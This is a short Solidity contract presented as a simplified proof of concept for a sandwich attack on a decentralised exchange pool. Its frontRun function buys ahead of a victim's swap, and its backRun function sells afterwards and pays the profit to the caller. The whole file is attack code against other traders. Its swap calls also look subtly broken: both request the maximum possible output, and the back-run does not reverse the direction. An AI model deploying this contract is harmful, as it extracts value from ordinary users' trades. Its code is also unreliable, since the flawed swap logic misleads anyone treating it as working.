
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

// Simplified two-step sandwich PoC
contract Sandwich {
    IPair public pool;  // pool where the victim swaps
    IWETH public weth;

    constructor(address _pool, address _weth) {
        pool = IPair(_pool);
        weth = IWETH(_weth);
    }

    // Front-run: swap ETH -> token before victim
    function frontRun(uint256 ethAmount) external payable {
        weth.deposit{value: ethAmount}();
        weth.transfer(address(pool), ethAmount);
        pool.swap(0, type(uint256).max, address(this), "");
    }

    // Back-run: swap token -> ETH after victim fills
    function backRun(address token) external {
        IERC20(token).transfer(address(pool), IERC20(token).balanceOf(address(this)));
        pool.swap(0, type(uint256).max, address(this), "");
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }
}
